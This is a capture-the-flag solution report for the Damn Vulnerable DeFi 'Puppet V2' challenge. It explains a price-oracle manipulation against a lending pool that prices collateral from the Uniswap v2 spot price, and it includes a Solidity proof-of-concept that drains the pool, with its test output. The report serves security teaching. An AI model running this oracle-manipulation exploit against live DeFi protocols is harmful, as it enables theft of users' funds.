# Damn Vulnerable DeFi - Puppet V2 - Solution Report

## Problem Analysis

### Contract Summary

The main contract in this challenge is `PuppetV2Pool`, which allows users to borrow tokens by depositing WETH as collateral. Key functions include:

- `borrow(uint256 borrowAmount)`: Allows users to borrow tokens by depositing WETH.
- `calculateDepositOfWETHRequired(uint256 tokenAmount)`: Calculates the required WETH deposit for a given token amount.
- `_getOracleQuote(uint256 amount)`: Fetches the price from Uniswap v2 using official libraries.

The contract uses a Uniswap v2 exchange as a price oracle to determine the collateral requirements.

### Initial Setup

- Player's initial balance: 20 ETH and 10,000 DVT tokens
- Uniswap pool: 100 DVT and 10 WETH
- Lending pool: 1,000,000 DVT tokens

### Success Criteria

To solve the challenge, the player must:

1. Drain all DVT tokens (1,000,000) from the lending pool.
2. Transfer the drained tokens to the recovery address.

## Vulnerability

The vulnerability in this challenge lies in the `PuppetV2Pool` contract's reliance on Uniswap v2 as a price oracle without any safeguards against price manipulation. The critical vulnerability is in the `_getOracleQuote` function:

```solidity
function _getOracleQuote(uint256 amount) private view returns (uint256) {
    (uint256 reservesWETH, uint256 reservesToken) =
        UniswapV2Library.getReserves({factory: _uniswapFactory, tokenA: address(_weth), tokenB: address(_token)});

    return UniswapV2Library.quote({amountA: amount * 10 ** 18, reserveA: reservesToken, reserveB: reservesWETH});
}
```

This function directly uses the Uniswap pool's reserves to calculate the price, making it susceptible to manipulation through large trades. The vulnerability is exacerbated by:

1. Lack of time-weighted average price (TWAP): The contract uses the current spot price instead of a time-weighted average, making it vulnerable to flash loan attacks and large trades.

2. Small liquidity pool: The Uniswap pool has a relatively small amount of liquidity (100 DVT and 10 WETH), making it easier to manipulate the price with a large trade.

3. No slippage protection: The `borrow` function doesn't include any slippage protection or maximum price checks, allowing transactions to be executed even after significant price changes.

These vulnerabilities allow an attacker to manipulate the price of DVT tokens in the Uniswap pool, artificially lowering the WETH collateral required to borrow DVT tokens from the `PuppetV2Pool` contract.

## Attack Method

The attack exploits the vulnerability in the price oracle by manipulating the Uniswap v2 pool's price. The attack method consists of the following steps:

1. Price Manipulation:

   - Approve the Uniswap Router to spend the player's DVT tokens.
   - Swap all of the player's DVT tokens (10,000 DVT) for WETH through the Uniswap pool.
   - This large trade significantly impacts the pool's reserves, drastically reducing the price of DVT relative to WETH.

2. Prepare WETH:

   - Convert all remaining ETH to WETH.
   - This maximizes the amount of WETH available for the attack.

3. Calculate Required Collateral:

   - Use the `calculateDepositOfWETHRequired` function to determine the amount of WETH needed to borrow all DVT tokens from the lending pool.
   - Due to the price manipulation, this amount will be much lower than it should be.

4. Borrow DVT Tokens:

   - Approve the `PuppetV2Pool` contract to spend the required amount of WETH.
   - Call the `borrow` function to borrow all DVT tokens from the pool (1,000,000 DVT).
   - The manipulated price allows the attacker to borrow a large amount of DVT with a relatively small WETH deposit.

5. Complete the Attack:
   - Transfer all borrowed DVT tokens to the recovery address.

This attack method exploits the oracle's vulnerability to price manipulation, allowing the attacker to drain the entire DVT balance from the lending pool with a fraction of the intended collateral.

## Proof of Concept (PoC)

### Core Implementation

The core implementation of the attack is contained in the `test_puppetV2` function:

```solidity
function test_puppetV2() public checkSolvedByPlayer {
    // 1. Approve Uniswap Router to spend DVT tokens
    token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);

    // 2. Swap DVT for WETH to manipulate the price
    address[] memory path = new address[](2);
    path[0] = address(token);
    path[1] = address(weth);

    uniswapV2Router.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, 0, path, player, block.timestamp);

    // 3. Wrap all ETH to WETH
    uint256 playerEthBalance = player.balance;
    weth.deposit{value: playerEthBalance}();

    // 4. Calculate required WETH to borrow all DVT from the pool
    uint256 poolDvtBalance = token.balanceOf(address(lendingPool));
    uint256 wethRequired = lendingPool.calculateDepositOfWETHRequired(poolDvtBalance);

    // 5. Approve PuppetV2Pool to spend the exact amount of WETH required
    weth.approve(address(lendingPool), wethRequired);

    // 6. Borrow all DVT from the pool
    lendingPool.borrow(poolDvtBalance);

    // 7. Transfer borrowed DVT to recovery address
    token.transfer(recovery, poolDvtBalance);
}
```

### Running Result

```
    ├─ [519] DamnValuableToken::balanceOf(PuppetV2Pool: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0, "Lending pool still has tokens") [staticcall]
    │   └─ ← [Return]
    ├─ [519] DamnValuableToken::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]
    │   └─ ← [Return] 1000000000000000000000000 [1e24]
    ├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24], "Not enough tokens in recovery account") [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]
```
